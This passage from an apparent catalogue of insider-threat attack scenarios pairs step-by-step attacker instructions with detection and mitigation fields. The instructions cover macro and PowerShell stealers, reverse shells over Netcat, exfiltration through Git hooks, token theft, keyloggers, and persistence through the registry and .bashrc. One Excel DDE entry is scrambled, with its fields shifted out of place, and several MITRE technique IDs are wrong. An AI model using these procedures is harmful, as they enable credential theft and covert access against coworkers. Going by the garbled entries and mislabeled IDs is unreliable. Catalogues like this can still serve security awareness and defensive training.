- **Attack Steps**: Step 1: Insider writes to colleague: “Your tool access expires in 60 minutes. Click here to reset now.”Step 2: Provides link to fake login/reset page.Step 3: Colleague follows link and enters credentials.Step 4: Page logs and stores inputs silently.Step 5: Insider uses data for unauthorized access.
- **Detection**: Phishing link detection
- **Solution**: Verify system notices only via email or dashboard
- **Tags**: #FakeReset #ChatPhish #InternalScam

## “Secure USB” Gift with Malware

- **Attack Type**: Physical Gift Attack
- **Target**: Employee Laptops
- **Vulnerability**: Blind trust in USB devices
- **MITRE**: T1200 (Hardware Additions)
- **Impact**: Full system compromise
- **Tools**: USB Rubber Ducky or HID Payload
- **Scenario**: Insider gifts branded USB drives at a team event that installs malware once plugged in.
- **Attack Steps**: Step 1: Insider prepares USB drives with auto-run malware or keylogger.Step 2: Gives them as “event gifts” or “freebies” at team meet.Step 3: Some coworkers plug it into laptops.Step 4: USB installs malicious script silently.Step 5: Insider gets remote access or local data dump.
- **Detection**: Device inventory, USB usage alerts
- **Solution**: Ban unverified USB usage
- **Tags**: #USBScam #GiftTrap #MalwareDrive

## Fake “Security Patch Required” Ticket

- **Attack Type**: Internal Phish via IT Ticket
- **Target**: IT Ticket System
- **Vulnerability**: Unverified ticket instructions
- **MITRE**: T1203 (Exploitation via Execution)
- **Impact**: Mass infection
- **Tools**: ITSM Platform, Malicious Installer
- **Scenario**: Insider raises a fake ticket requesting all users to install a “security patch” (malware disguised as .exe).
- **Attack Steps**: Step 1: Insider creates an IT ticket titled “Critical SSL Patch – All Systems.”Step 2: IT sends link to users assuming it’s verified.Step 3: Employees download and install the malware.Step 4: System gets compromised; insider uses it for access.Step 5: Attacker deletes ticket to hide activity.
- **Detection**: Ticket change logs, link sandboxing
- **Solution**: Dual IT review for patch deployment
- **Tags**: #PatchScam #FakeTicket #ExecutionAbuse

## Fake “Knowledge Base Access” Email

- **Attack Type**: Fake Internal System Phish
- **Target**: Email/Web Portal
- **Vulnerability**: Fake site with real UI
- **MITRE**: T1566.002 (Phishing – Link)
- **Impact**: Credential theft
- **Tools**: Email + Phishing Site
- **Scenario**: Insider emails team asking them to log in to a new KB system that actually logs credentials.
- **Attack Steps**: Step 1: Insider sets up a fake knowledge base (e.g., confluence-clone.intra).Step 2: Sends email: “New internal KB live – login with email credentials.”Step 3: Recipients open and log in.Step 4: Their credentials are harvested silently.Step 5: Insider reuses them across systems.
- **Detection**: DNS logs, browser warnings
- **Solution**: Allow logins only from internal whitelisted domains
- **Tags**: #FakeKB #PhishingEmail #InsiderAccess

## Piggyback Entry in Restricted Zone

- **Attack Type**: Physical Entry Attack
- **Target**: Physical Premises
- **Vulnerability**: No door monitoring
- **MITRE**: T1078.004 (Valid Physical Access)
- **Impact**: Data theft, hardware tampering
- **Tools**: None (Tailgating)
- **Scenario**: Insider waits outside restricted door and follows authorized person to sneak into secure area.
- **Attack Steps**: Step 1: Insider waits near restricted lab/HR zone.Step 2: Times entry to follow someone with valid access badge.Step 3: Smiles or pretends to talk on phone to avoid suspicion.Step 4: Enters secured zone without badge.Step 5: Performs malicious activity or data theft inside.
- **Detection**: CCTV review, tailgating reports
- **Solution**: Use mantraps, enforce badge scan per entry
- **Tags**: #Tailgating #PhysicalEntry #AccessAbuse

## Fake “Internal Audit Form” via Spreadsheet

- **Attack Type**: Trust Exploit via Document
- **Target**: Cloud Docs
- **Vulnerability**: Form trust, hidden script
- **MITRE**: T1056.001 (Input Capture)
- **Impact**: Recon and credential theft
- **Tools**: Google Sheets Script
- **Scenario**: Insider shares an “internal audit” spreadsheet that logs form inputs to their email.
- **Attack Steps**: Step 1: Insider shares Google Sheet titled “Compliance Audit – Fill by EOD.”Step 2: Sheet has Google Apps Script that sends entries to insider’s email.Step 3: Sheet asks for tools used, credentials, IPs.Step 4: Team fills it assuming it’s from security team.Step 5: Insider collects sensitive data silently.
- **Detection**: Detect custom script triggers
- **Solution**: Restrict form fields, audit document access
- **Tags**: #AuditPhish #FormTrap #SpreadsheetHack

## Shared Desktop Keylogger Install

- **Attack Type**: In-Person Malware Drop
- **Target**: Public Kiosks / Shared PCs
- **Vulnerability**: Lack of supervision
- **MITRE**: T1056.001 (Keylogging)
- **Impact**: Credential theft
- **Tools**: Keylogger (software or hardware)
- **Scenario**: Insider uses break time to plug in USB and install keylogger on shared receptionist or guest PC.
- **Attack Steps**: Step 1: Insider walks to unattended shared computer.Step 2: Inserts USB and installs silent keylogger.Step 3: Leaves the station in under 30 seconds.Step 4: Keylogger records all typed content (emails, logins).Step 5: Insider returns later to retrieve logs.
- **Detection**: Device check, input monitoring
- **Solution**: Secure and lock shared systems
- **Tags**: #Keylogger #SharedPCExploit #UnattendedDevice

## USB Drop Malware Execution

- **Attack Type**: Malicious USB Script
- **Target**: Employee Workstations
- **Vulnerability**: AutoRun Enabled USB ports
- **MITRE**: T1200 (Hardware Additions)
- **Impact**: Credential Theft, Persistent Access
- **Tools**: Rubber Ducky, Windows Script
- **Scenario**: An employee drops infected USBs in office or public areas to get someone to plug them into a work computer.
- **Attack Steps**: Step 1: Buy or create a USB that automatically runs a script when plugged in.Step 2: Write a simple script that can steal passwords or install malware silently.Step 3: Drop the USB in office cafeteria or bathroom.Step 4: Another employee picks it up and plugs it in out of curiosity.Step 5: The script runs and installs a backdoor or keylogger.
- **Detection**: Endpoint USB Logging, AV Alerts
- **Solution**: Disable USB AutoRun, Endpoint Control
- **Tags**: USB, Social Engineering, Scripts

## Script via Shared Drive

- **Attack Type**: PowerShell Script Injection
- **Target**: Shared Drive System
- **Vulnerability**: File Execution from Shared Folders
- **MITRE**: T1059.001 (PowerShell)
- **Impact**: Data Exfiltration, Unauthorized Access
- **Tools**: PowerShell, Notepad
- **Scenario**: Insider uploads a PowerShell script disguised as a report in a shared drive.
- **Attack Steps**: Step 1: Write a PowerShell script that steals files or sends data to your email.Step 2: Save the script as a .ps1 or embed it in a .bat file.Step 3: Rename it to "Monthly_Report_Review.bat".Step 4: Upload it to a team’s shared folder.Step 5: Another user downloads and opens it, unknowingly executing the malicious script.
- **Detection**: File Access Logs, Email Alerts
- **Solution**: Educate users, Scan shared drives, Disable .bat/.ps1 auto execution
- **Tags**: PowerShell, Shared Drive, Obfuscation

## Email Attachment Auto-Execution

- **Attack Type**: Script in Excel Macro
- **Target**: HR/Finance Dept
- **Vulnerability**: Macro Auto-Execution
- **MITRE**: T1566.001 (Phishing: Attachment)
- **Impact**: Credential Leak, Surveillance
- **Tools**: MS Excel, VBA Macro
- **Scenario**: Insider sends an Excel sheet with an embedded macro to HR or finance.
- **Attack Steps**: Step 1: Open MS Excel and insert a macro using the developer tab.Step 2: Macro sends data (e.g., email password or screenshot) to attacker email.Step 3: Save the file as “Salary_Breakdown_Q2.xlsm”.Step 4: Email it to HR team saying “Please check the updated file”.Step 5: When HR opens and enables macros, the malicious macro runs.
- **Detection**: Email Gateway Filtering, Macro Alert
- **Solution**: Disable Macros, Use Email Sandboxing
- **Tags**: Macro, HR, Finance, Phishing

## Scheduled Task with Script

- **Attack Type**: Task Scheduler Script Abuse
- **Target**: Local Workstation
- **Vulnerability**: Misconfigured Task Scheduler
- **MITRE**: T1053 (Scheduled Task)
- **Impact**: Persistent Remote Access
- **Tools**: Windows Task Scheduler, Netcat
- **Scenario**: Insider sets up a scheduled task that runs a reverse shell daily at lunch.
- **Attack Steps**: Step 1: Open Task Scheduler on work PC.Step 2: Create a new task that runs a .bat file.Step 3: Inside the bat file, add Netcat command to send remote access back to attacker system.Step 4: Set it to run every day at 1:00 PM when most people are away.Step 5: Wait for connection and collect sensitive data.
- **Detection**: System Task Log Monitoring
- **Solution**: Restrict task creation, Review scheduled tasks
- **Tags**: Task Scheduler, Lateral Access

## Script Injection via Jenkins

- **Attack Type**: CI/CD Script Abuse
- **Target**: DevOps CI/CD
- **Vulnerability**: Weak Job Review in Jenkins
- **MITRE**: T1505.003 (Compromise CI/CD)
- **Impact**: Supply Chain Infection
- **Tools**: Jenkins, Shell Script
- **Scenario**: Insider abuses Jenkins job to run malicious shell commands during a fake update.
- **Attack Steps**: Step 1: Access Jenkins server (insider has dev credentials).Step 2: Go to an existing job or create a new one.Step 3: Insert a shell command to download malware or open a reverse shell.Step 4: Save and execute the job with a title like "Build Patch v1.3".Step 5: Malware gets installed on build server or other linked servers.
- **Detection**: Jenkins Job Audit, Shell Command Log
- **Solution**: Limit Jenkins access, Review jobs regularly
- **Tags**: CI/CD, Jenkins, DevOps, Script

## Malicious Chrome Extension

- **Attack Type**: Browser-Based Script
- **Target**: Employee Browsers
- **Vulnerability**: Browser Extension Permissions
- **MITRE**: T1176 (Browser Extensions)
- **Impact**: Data Exfiltration
- **Tools**: JavaScript, Chrome Extension
- **Scenario**: Insider installs or distributes a Chrome extension that steals data from browser sessions.
- **Attack Steps**: Step 1: Find or create a Chrome extension that reads web activity or clipboard.Step 2: Pack it and rename it as a “productivity tool”.Step 3: Share it with teammates via email or file server.Step 4: Ask them to “install for testing”.Step 5: Extension runs and logs sensitive URLs, cookies, or clipboard data.
- **Detection**: Browser Extension Inventory
- **Solution**: Block unverified extensions
- **Tags**: Chrome, JavaScript, Clipboard

## Script via Printer Firmware Update

- **Attack Type**: Peripheral Firmware Abuse
- **Target**: Office Printers
- **Vulnerability**: Unchecked Firmware Updates
- **MITRE**: T1542.001 (Peripheral Firmware)
- **Impact**: Document Theft
- **Tools**: Printer Firmware, Bash
- **Scenario**: Insider modifies printer firmware to run scripts when document is scanned/printed.
- **Attack Steps**: Step 1: Download open-source printer firmware (e.g., for office printer model).Step 2: Insert shell command to upload scanned document to attacker’s FTP.Step 3: Flash modified firmware onto office printer during maintenance.Step 4: When someone scans a doc, it silently sends a copy to the attacker.Step 5: Attacker monitors for classified files.
- **Detection**: Network Printer Traffic Analysis
- **Solution**: Firmware Signing, Access Control
- **Tags**: Printer, Firmware, FTP

## Obfuscated Script via Chat App

- **Attack Type**: Script via Messaging App
- **Target**: Internal Messaging Systems
- **Vulnerability**: Lack of Script Scanning
- **MITRE**: T1059 (Command/Scripting Interpreter)
- **Impact**: System Info Leak
- **Tools**: Python, Slack, Base64
- **Scenario**: Insider sends obfuscated malware via Slack or Teams disguised as a code snippet.
- **Attack Steps**: Step 1: Write a Python or PowerShell script that sends system info to attacker.Step 2: Encode it using Base64 or make it look like a harmless snippet.Step 3: Send it on a dev channel, saying “try this script for debugging”.Step 4: Another dev runs it thinking it’s a helper tool.Step 5: The script runs and sends info outside.
- **Detection**: DLP Tools, Chatbot Filters
- **Solution**: Train users, block file/script transfers
- **Tags**: Chat App, Base64, Dev Team

## Remote Code via Notepad++ Plugin

- **Attack Type**: Plugin Abuse
- **Target**: Developer Machines
- **Vulnerability**: Plugin Trust Assumption
- **MITRE**: T1546.010 (App Plugin)
- **Impact**: Remote Execution
- **Tools**: C++, Notepad++ Plugin SDK
- **Scenario**: Insider creates a plugin for Notepad++ that runs code in background.
- **Attack Steps**: Step 1: Write a plugin that looks like a syntax highlighter.Step 2: In background, add code to run a command or send files.Step 3: Compile and rename it "npp_devtools.dll".Step 4: Share on internal Git or email it with instructions.Step 5: As others install, plugin runs malicious commands silently.
- **Detection**: File Audit, DLL Behavior Logs
- **Solution**: Block unsigned plugins
- **Tags**: Notepad++, Plugin, DLL

## Malicious Shortcut File (LNK)

- **Attack Type**: LNK File Script
- **Target**: Shared Machines
- **Vulnerability**: LNK Execution
- **MITRE**: T1204.002 (Malicious File)
- **Impact**: Local Access, Malware Drop
- **Tools**: Windows LNK, CMD, VBScript
- **Scenario**: Insider creates a shortcut file with hidden commands and leaves it on desktop.
- **Attack Steps**: Step 1: Right-click a file and create a shortcut (.lnk).Step 2: Edit shortcut target to run hidden script with icon of a PDF or Excel.Step 3: Name it “Leave_Policy_2025.pdf.lnk”.Step 4: Place on common desktop or USB drive.Step 5: User clicks it and unknowingly executes malware.
- **Detection**: File Scanning, AV Alert
- **Solution**: Hide file extensions, Disable .lnk scripting
- **Tags**: LNK, VBScript, Social Engineering

## Word Macro via Internal Policy Document

- **Attack Type**: Weaponized DOCX
- **Target**: HR Intranet
- **Vulnerability**: Document Macro Abuse
- **MITRE**: T1566.001
- **Impact**: PII Leak, Phishing Setup
- **Tools**: MS Word, VBA, Outlook API
- **Scenario**: Insider adds macro to HR policy document shared across company.
- **Attack Steps**: Step 1: Open Word and add a macro to extract Outlook contacts.Step 2: Save document as “Remote_Work_Policy_2025.docm”.Step 3: Upload to intranet or shared drive.Step 4: When someone opens and enables macro, it sends contact list via email.Step 5: Attacker uses these for spear phishing.
- **Detection**: Macro Execution Logs, DLP
- **Solution**: Block macros from internet docs
- **Tags**: HR, Macro, Word

## Custom Login Script on Kiosk

- **Attack Type**: Script in Login Process
- **Target**: Linux Kiosks
- **Vulnerability**: Login Script Modification
- **MITRE**: T1037.001 (Logon Script)
- **Impact**: Password Harvesting
- **Tools**: Shell Script, Bash, Linux
- **Scenario**: Insider edits login script on a public system (e.g., reception kiosk) to store credentials.
- **Attack Steps**: Step 1: Edit /etc/profile or login script.Step 2: Add command to save entered password to a hidden file.Step 3: Wait for users to log in.Step 4: Collect file later and read credentials.Step 5: Use credentials to access internal systems.
- **Detection**: Bash History, Login Log Review
- **Solution**: Lock login scripts, Use MFA
- **Tags**: Linux, Kiosk, Credentials

## Scripted Screenshot Stealer

- **Attack Type**: Auto Screenshot Capture
- **Target**: Employee Desktop
- **Vulnerability**: Open Script Execution
- **MITRE**: T1113 (Screen Capture)
- **Impact**: Intellectual Property Theft
- **Tools**: Python (pyautogui), Windows
- **Scenario**: Insider runs a script that takes screenshots every few seconds and stores in hidden folder.
- **Attack Steps**: Step 1: Write Python script using pyautogui to take screen every 30s.Step 2: Save in background and store images in a hidden folder.Step 3: Schedule script to run on system boot.Step 4: Let it run silently.Step 5: Later, collect the screenshots via USB or cloud sync.
- **Detection**: Unusual file creation alerts
- **Solution**: Restrict script execution, Monitor task scheduler
- **Tags**: Screenshot, Python, IP Theft

## Git Hook Abuse

- **Attack Type**: Post-Commit Script Injection
- **Target**: Source Code Repos
- **Vulnerability**: Git Hook Abuse
- **MITRE**: T1059 (Shell)
- **Impact**: Code Leak
- **Tools**: Git, Bash
- **Scenario**: Insider adds malicious post-commit hook in team’s Git repo to exfiltrate code on each commit.
- **Attack Steps**: Step 1: Open team repo and go to .git/hooks folder.Step 2: Edit or add a post-commit file that runs curl to send files.Step 3: Push code with hook enabled.Step 4: When team commits code, hook runs and sends files to remote server.Step 5: Attacker gets updated repo outside organization.
- **Detection**: Git Activity Monitor
- **Solution**: Disable local hooks, Audit repo configs
- **Tags**: Git, Bash, Exfil

## Python Script Embedded in Game/App

- **Attack Type**: Trojanized App
- **Target**: Internal Apps
- **Vulnerability**: Lack of Code Review
- **MITRE**: T1204 (User Execution)
- **Impact**: Full System Access
- **Tools**: Python, Tkinter, Socket
- **Scenario**: Insider adds malicious Python code in a team-made internal app/game.
- **Attack Steps**: Step 1: Take a simple office game or tool in Python.Step 2: Embed code that opens a reverse shell or sends keylogs.Step 3: Share app via Slack/email for "fun".Step 4: Others run it casually.Step 5: Script runs and provides remote access.
- **Detection**: Socket Monitoring, Process Scanning
- **Solution**: Code review, Limit app installs
- **Tags**: Python, Internal App, Trojan

## AutoHotKey Keylogger Script

- **Attack Type**: Keyboard Logging via Script
- **Target**: Office PCs
- **Vulnerability**: Script Allowed Execution
- **MITRE**: T1056.001 (Keylogging)
- **Impact**: Credential Theft
- **Tools**: AutoHotKey
- **Scenario**: Insider creates a keylogger using AutoHotKey and runs it on office systems.
- **Attack Steps**: Step 1: Install AutoHotKey (free scripting tool).Step 2: Write a script that logs keystrokes and saves to a file.Step 3: Compile it into an .exe file.Step 4: Run it on the system and minimize the window.Step 5: Collect the file after a day to get all typed passwords.
- **Detection**: Unusual Process Detection
- **Solution**: Disable script engines, Monitor startup scripts
- **Tags**: Keylogger, AutoHotKey, Insider

## Python Reverse Shell via Email

- **Attack Type**: Scripted Shell Access
- **Target**: Internal PC
- **Vulnerability**: Open File Execution
- **MITRE**: T1059.006 (Python)
- **Impact**: Full Remote Access
- **Tools**: Python, Netcat
- **Scenario**: Insider emails a Python file that opens a reverse shell when executed.
- **Attack Steps**: Step 1: Write a Python script to connect back to attacker’s IP on port 4444.Step 2: Email it to a coworker as a “debug tool”.Step 3: Receiver runs it.Step 4: Attacker gets full remote shell to target system.Step 5: Navigate, download or upload files.
- **Detection**: Network Intrusion Alert
- **Solution**: Block outgoing shells, Use sandbox email
- **Tags**: Python, Reverse Shell, Email

## Slack Token Harvester Script

- **Attack Type**: API Token Theft
- **Target**: Browser Cache
- **Vulnerability**: Weak Token Storage
- **MITRE**: T1528 (Cloud Tokens)
- **Impact**: Impersonation, Data Leak
- **Tools**: Python, SQLite
- **Scenario**: Insider writes a script to extract Slack auth tokens from browser files.
- **Attack Steps**: Step 1: Write a Python script to read browser cookie/database files.Step 2: Extract Slack auth token from stored sessions.Step 3: Send it to attacker's email or server.Step 4: Log in as user using stolen token.Step 5: Access Slack messages, files, and channels.
- **Detection**: Session Activity Monitor
- **Solution**: Secure cookie/token storage, MFA
- **Tags**: Slack, Token, Cloud Access

## Fake Software Installer with Script

- **Attack Type**: Trojan Installer
- **Target**: Employee Laptops
- **Vulnerability**: Trust in Internal Files
- **MITRE**: T1204.002
- **Impact**: Persistent Access
- **Tools**: Inno Setup, Python
- **Scenario**: Insider sends a fake installer to a teammate that installs spyware.
- **Attack Steps**: Step 1: Use a software packaging tool (like Inno Setup).Step 2: Bundle a real tool (e.g., Notepad++) with a spyware script.Step 3: Send to team via email saying “use this patched version”.Step 4: When installed, real tool works normally but spyware runs in background.Step 5: It logs activity or opens a backdoor.
- **Detection**: Unusual Background Process Logs
- **Solution**: Verify installers, Use signed software
- **Tags**: Trojan, Installer, Spyware

## Remote Access via Excel DDE

- **Attack Type**: Dynamic Data Exchange Abuse
- **Target**: ‘ /c calc’!A0(DDE technique).<br>Step 2: Replacecalc` with a reverse shell or payload URL.Step 3: Send file to a coworker as “Budget_Dashboard.xls”.Step 4: On opening, Excel prompts user — if accepted, it runs the command.Step 5: Establishes remote access or installs malware.
- **Vulnerability**: Office Suite
- **MITRE**: DDE Execution
- **Impact**: T1220 (XLS DDE)
- **Tools**: MS Excel, DDE
- **Scenario**: Insider crafts Excel file that uses DDE to connect to malicious server.
- **Attack Steps**: Step 1: Open Excel and insert a formula using `=cmd
- **Detection**: Malware Deployment
- **Solution**: User Prompt Detection
- **Tags**: Disable DDE, Block unknown macros

## Hidden Script in Image File

- **Attack Type**: Steganography Malware
- **Target**: File Server
- **Vulnerability**: Steganography
- **MITRE**: T1027.003
- **Impact**: Covert Malware Drop
- **Tools**: Steghide, Bash
- **Scenario**: Insider hides script in image file and extracts/executes it locally.
- **Attack Steps**: Step 1: Use steghide or similar tool to hide script inside .jpg.Step 2: Move image to shared folder or email it.Step 3: On attacker system, extract hidden script.Step 4: Execute the extracted script to steal or upload data.Step 5: Clean evidence and remove image later.
- **Detection**: Monitor image file sizes, Steg-detection tools
- **Solution**: Block .exe/.bat in image payloads
- **Tags**: Steg, Covert, File Share

## Script via QR Code

- **Attack Type**: QR Code Malware
- **Target**: BYOD/Phones
- **Vulnerability**: Trust in QR
- **MITRE**: T1204 (User Execution)
- **Impact**: Credential Phishing
- **Tools**: QR Code Generator
- **Scenario**: Insider embeds script URL in a QR code and prints it around office.
- **Attack Steps**: Step 1: Host a script online (like on pastebin or GitHub).Step 2: Create a QR code that links to the malicious script.Step 3: Print and place in lunch area with text “Scan for coupons!”.Step 4: Curious employees scan using their phone or browser.Step 5: Some scripts download or request sensitive input.
- **Detection**: DNS/URL access alerts
- **Solution**: Train staff, scan QR before use
- **Tags**: QR Code, Phishing, Script URL

## Browser Bookmarklet Attack

- **Attack Type**: JavaScript via Bookmark
- **Target**: Browsers
- **Vulnerability**: Bookmark Execution
- **MITRE**: T1176
- **Impact**: Session Theft
- **Tools**: JavaScript
- **Scenario**: Insider creates a malicious bookmarklet that runs JS in browser.
- **Attack Steps**: Step 1: Write JS that sends cookies or clipboard content to attacker.Step 2: Create a bookmark link like javascript:(function(){...})().Step 3: Share with teammate: “Use this shortcut for debug”.Step 4: Teammate adds it to bookmarks and clicks during use.Step 5: Data gets sent to external server.
- **Detection**: Monitor outgoing requests
- **Solution**: Disable JS in bookmarks
- **Tags**: Bookmarklet, JavaScript, Cookie Theft

## Obfuscated PowerShell in PDF

- **Attack Type**: Script inside PDF
- **Target**: PDF Documents
- **Vulnerability**: Link Script Execution
- **MITRE**: T1059.001
- **Impact**: Malware, Data Exfiltration
- **Tools**: PowerShell, PDF Editor
- **Scenario**: Insider embeds script as a clickable link inside PDF doc.
- **Attack Steps**: Step 1: Use PDF editor to embed clickable content with powershell -EncodedCommand ....Step 2: Distribute document as “WorkFromHome_Policy.pdf”.Step 3: When user clicks link, PowerShell opens and runs the command.Step 4: Script downloads malware or sends data.Step 5: Attacker monitors results.
- **Detection**: PDF Click Logs, PowerShell Alerts
- **Solution**: Block script links in PDFs
- **Tags**: PDF, PowerShell, EncodedCommand

## Windows Registry Persistence Script

- **Attack Type**: Registry Abuse
- **Target**: Windows Systems
- **Vulnerability**: Registry Persistence
- **MITRE**: T1547.001
- **Impact**: Persistent Access
- **Tools**: Regedit, CMD
- **Scenario**: Insider adds script path to Windows startup registry key.
- **Attack Steps**: Step 1: Create or download a malicious script (keylogger, reverse shell).Step 2: Press Win+R, type regedit.Step 3: Go to HKCU\Software\Microsoft\Windows\CurrentVersion\Run.Step 4: Add new entry pointing to script.Step 5: On every reboot, the script runs automatically.
- **Detection**: Registry Change Monitoring
- **Solution**: Lock registry edits, monitor autoruns
- **Tags**: Registry, Persistence, Boot

## Python Script in Screensaver

- **Attack Type**: Scripted Screensaver
- **Target**: Windows Systems
- **Vulnerability**: Screensaver Execution
- **MITRE**: T1059.006 (Python), T1204.002
- **Impact**: Covert Access, Data Theft
- **Tools**: Python, py2exe, SCR compiler
- **Scenario**: Insider embeds malicious Python script in a screensaver file to execute silently.
- **Attack Steps**: Step 1: Write a script that logs user activity or opens a backdoor.Step 2: Convert the script to .exe and rename it with .scr extension.Step 3: Copy it into the Windows screensaver folder or email it as “custom screensaver”.Step 4: When activated, it appears like a normal screensaver but runs hidden script.Step 5: Script sends data or opens a hidden session.
- **Detection**: Monitor .scr file executions
- **Solution**: Block unknown screensavers, restrict folder access
- **Tags**: Screensaver, Python, Hidden Script

## Bash Script in .bashrc File

- **Attack Type**: Shell Script Persistence
- **Target**: Linux Systems
- **Vulnerability**: User Script Persistence
- **MITRE**: T1037.005 (Shell Initialization)
- **Impact**: Persistent Credential Theft
- **Tools**: Linux Bash
- **Scenario**: Insider adds a command to .bashrc file that runs a script each time terminal opens.
- **Attack Steps**: Step 1: Open .bashrc file in home directory (nano ~/.bashrc).Step 2: Add a line like bash /home/user/.hidden/stealer.sh &.Step 3: Save and exit.Step 4: Each time user opens terminal, the stealer script runs.Step 5: It sends credentials or files silently.
- **Detection**: Monitor file changes
- **Solution**: Restrict .bashrc edits, integrity checks
- **Tags**: Bash, Linux, Startup

## Discord Token Stealer Script

- **Attack Type**: Cloud App Exploit
- **Target**: Discord App
- **Vulnerability**: Token Storage in Plaintext
- **MITRE**: T1528 (Steal Application Token)
- **Impact**: Account Hijack
- **Tools**: Python, OS module
- **Scenario**: Insider writes a script to extract Discord auth tokens and access accounts remotely.
- **Attack Steps**: Step 1: Script navigates to local Discord data folders.Step 2: Extracts stored authentication tokens.Step 3: Sends tokens to attacker server.Step 4: Attacker logs into user Discord, impersonates or steals files.Step 5: May pivot from personal to corporate servers.
- **Detection**: Monitor API usage & login IPs
- **Solution**: Token encryption, Monitor Discord access
- **Tags**: Discord, Token, Impersonation

## Script Triggered by USB Insertion

- **Attack Type**: USB Event Automation
- **Target**: Windows PC
- **Vulnerability**: Task Trigger Exploit
- **MITRE**: T1053.005 (Scheduled Task/Job)
- **Impact**: Data Theft, Persistence
- **Tools**: Windows Task Scheduler, CMD
- **Scenario**: Insider creates script that auto-runs on USB insertion via Task Scheduler.
- **Attack Steps**: Step 1: Create Task Scheduler rule: “On USB Insertion” trigger.Step 2: Task runs script to copy files or install malware.Step 3: Store script in C:\Users\Public\usb_task.bat.Step 4: Insert USB – task triggers silently.Step 5: Files copied, or backdoor installed without user noticing.
- **Detection**: Monitor new task creation
- **Solution**: Restrict auto-triggers, log USB events
- **Tags**: USB, Task Scheduler, Silent Copy

## Script as Fake VPN Launcher

- **Attack Type**: Script in Network Tools
- **Target**: Remote Workers
- **Vulnerability**: Trust in Internal Tools
- **MITRE**: T1204.002
- **Impact**: Credential Theft, Surveillance
- **Tools**: Python, EXE builder
- **Scenario**: Insider bundles malware into a fake VPN app used by remote employees.
- **Attack Steps**: Step 1: Create a launcher script that looks like a VPN app.Step 2: Show GUI saying “VPN Connected”.Step 3: In background, run keylogger or screen capture.Step 4: Distribute to remote staff via “internal tools” email.Step 5: Staff uses it, unknowingly exposing system.
- **Detection**: Check endpoint processes
- **Solution**: Use signed VPN tools, verify internal tools
- **Tags**: VPN, Remote Work, Fake Tool

## Hidden Payload in Git README

- **Attack Type**: Encoded Script in Docs
- **Target**: Git Repo Users
- **Vulnerability**: Misuse of Documentation
- **MITRE**: T1036.005 (Masquerading)
- **Impact**: Script Execution, Shell
- **Tools**: Git, Base64, PowerShell
- **Scenario**: Insider places base64-encoded malicious script in the README.md of internal Git repo.
- **Attack Steps**: Step 1: Encode PowerShell malware using base64.Step 2: Paste into README.md with caption “debug command snippet”.Step 3: Other devs copy-paste and decode to test.Step 4: Script runs and exfiltrates files or opens shell.Step 5: Attacker gains access to their system.
- **Detection**: Unusual command usage logs
- **Solution**: Educate on encoded script risks
- **Tags**: Base64, GitHub, CopyPaste

## Insider Abuses AutoHotKey for GUI Spoof

- **Attack Type**: Fake Window Attack
- **Target**: Office Systems
- **Vulnerability**: GUI Spoofing
- **MITRE**: T1556.002 (Input Prompt)
- **Impact**: Phishing Credentials
- **Tools**: AutoHotKey, Windows GUI
- **Scenario**: Insider creates a script that looks like a legit app popup asking for login.
- **Attack Steps**: Step 1: Use AutoHotKey to create a fake login window titled “Outlook Session Expired”.Step 2: User enters email and password.Step 3: Script saves to hidden .txt.Step 4: Insider collects file later.Step 5: Use credentials to access mailbox.
- **Detection**: UI Monitor Tools
- **Solution**: Train staff, verify popups
- **Tags**: GUI, Phishing, Script

## JavaScript Injection in Internal CMS

- **Attack Type**: Scripted CMS Backdoor
- **Target**: Intranet CMS
- **Vulnerability**: Lack of Script Filtering
- **MITRE**: T1059.007 (JavaScript)
- **Impact**: Cookie Theft, Redirects
- **Tools**: JavaScript, Internal CMS
- **Scenario**: Insider injects JS in a CMS announcement that runs when employees log in.
- **Attack Steps**: Step 1: Login to internal CMS with editor rights.Step 2: Insert <script> tag in a visible news section.Step 3: Script logs cookies or redirects to phishing page.Step 4: Users log in and unknowingly trigger script.Step 5: Data is sent to attacker.
- **Detection**: DOM Monitor, CSP Policy
- **Solution**: Sanitize CMS input, JS filter
- **Tags**: CMS, Internal Tool, XSS

## Auto-Sync Script via Cloud Storage

- **Attack Type**: Sync Malware Script
- **Target**: Cloud Synced Devices
- **Vulnerability**: Unchecked Startup Files
- **MITRE**: T1547.001
- **Impact**: Persistent Access
- **Tools**: Google Drive/Dropbox + Python
- **Scenario**: Insider places script in synced cloud folder, runs on boot from other devices.
- **Attack Steps**: Step 1: Insider shares a Drive folder with colleague.Step 2: Adds startup_script.bat in shared folder.Step 3: Target system syncs and runs it on boot via Startup folder.Step 4: Script logs credentials or opens connection.Step 5: Insider gets access remotely.
- **Detection**: Cloud File Monitoring
- **Solution**: Limit sync folders, scan new files
- **Tags**: Cloud, Sync, Auto Execution

## Script through Idle Mouse Monitor

- **Attack Type**: Idle Time Trigger Script
- **Target**: Office Workstations
- **Vulnerability**: Idle Time Exploitation
- **MITRE**: T1053 (Execution Trigger)
- **Impact**: Data Theft
- **Tools**: Python, pyautogui
- **Scenario**: Insider runs a script that only activates when mouse is idle for 10 mins.
- **Attack Steps**: Step 1: Write a script using pyautogui to monitor mouse movement.Step 2: If idle for 10 minutes, run data exfil script.Step 3: Run script as background task.Step 4: While user is away, script activates.Step 5: Collect screenshots, files, or access systems silently.
- **Detection**: Task Monitor, Script Watchdog
- **Solution**: Lock screen timeout, detect idle behavior
- **Tags**: Idle Monitor, pyautogui, Stealth

## Script Hidden in ISO File

- **Attack Type**: ISO Malware Dropper
- **Target**: Desktop Systems
- **Vulnerability**: ISO Autorun
- **MITRE**: T1204.002 (Malicious File)
- **Impact**: Silent Malware Execution
- **Tools**: Windows ISO Tool, .bat file
- **Scenario**: Insider sends a .iso file with a script set to autorun when mounted.
- **Attack Steps**: Step 1: Create a .bat script that installs keylogger or reverse shell.Step 2: Use an ISO creator to pack the .bat file inside and rename file to HR_Policies_2025.iso.Step 3: Share via email or USB.Step 4: When user mounts the ISO and opens file, script runs silently.Step 5: Attacker gets access or logs user activity.
- **Detection**: File extension monitoring, disable ISO execution
- **Solution**: Block ISO file types, disable autoplay
- **Tags**: ISO, Script, Autorun

## Excel Named Range Script Abuse

- **Attack Type**: Script via Excel Feature
- **Target**: Office Documents
- **Vulnerability**: Excel Feature Exploitation
- **MITRE**: T1566.001
- **Impact**: Command Execution
- **Tools**: MS Excel, VBA
- **Scenario**: Insider abuses Excel "Named Range" to trigger shell code via formula.
- **Attack Steps**: Step 1: Open Excel and create a Named Range (Formulas > Name Manager).Step 2: Set it to execute a command like cmd /c whoami when a cell updates.Step 3: Save as .xlsm file and share as “Budget Report Final”.Step 4: When coworker interacts, command runs silently.Step 5: Use this method to launch backdoor or scripts.
- **Detection**: Excel command logs, formula audits
- **Solution**: Disable dynamic ranges and macro execution
